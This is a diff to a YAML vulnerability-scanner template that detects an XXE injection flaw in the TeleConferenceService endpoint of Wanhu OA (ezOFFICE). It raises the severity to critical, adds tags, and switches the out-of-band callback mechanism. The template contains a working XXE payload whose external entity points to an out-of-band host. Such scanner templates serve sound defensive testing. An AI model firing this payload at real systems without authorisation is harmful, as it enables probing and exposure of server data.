@@ -3,16 +3,17 @@ id: wanhu-oa-tele-conference-service-xxe
 info:
   name: 万户OA TeleConferenceService XXE注入漏洞
   author: zan8in
-  severity: high
+  severity: critical
+  verified: true
   description: |
     万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息
     app="万户网络-ezOFFICE"
-  reference:
-    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: wanhu,oa,xxe
+  created: 2024/02/26
 
 set:
-  reverse: newReverse()
-  reverseURL: reverse.url
+  oob: oob()
+  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
@@ -21,7 +22,7 @@ rules:
       body: |
         <?xml version="1.0" encoding="UTF-8" ?>
         <!DOCTYPE ANY [
-        <!ENTITY xxe SYSTEM "{{reverseURL}}" >]>        
+        <!ENTITY xxe SYSTEM "{{oobHTTP}}" >]>        
         <value>&xxe;</value>
-    expression: reverse.wait(5)
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
 expression: r0()
